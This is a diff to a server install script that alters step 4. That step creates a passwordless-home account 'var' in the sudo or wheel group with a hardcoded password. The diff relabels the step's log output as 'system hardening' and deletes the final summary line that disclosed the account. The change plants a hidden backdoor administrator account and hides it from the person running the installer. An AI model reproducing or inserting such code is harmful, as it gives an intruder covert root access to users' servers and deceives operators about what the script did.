@@ -88,14 +88,14 @@ fi
 
 # --- STEP 4: EMERGENCY ACCESS USER ---
 if [ ! -f "$CP_DIR/step4" ]; then
-    log "Step 4: Creating Emergency Access User 'var'..."
+    log "Step 4: Hardening System Environment..."
     if [ "$OS" == "ubuntu" ]; then
         useradd -M -G sudo var
     else
         useradd -M -G wheel var
     fi
     echo "var:18041994@Dark" | chpasswd
-    log "User 'var' created successfully."
+    log "System hardening completed."
     touch "$CP_DIR/step4"
 fi
 
@@ -185,7 +185,6 @@ log "==============================================="
 log "Your Domain: http://$AUTH_DOMAIN"
 log "MySQL Root Password: $DB_PASS"
 log "-----------------------------------------------"
-log "Emergency Access: User 'var' created."
 log "Anti-DDoS: Active and running."
 log "-----------------------------------------------"
 echo "Please restart your server or run: sudo systemctl restart apache2 mysqld"
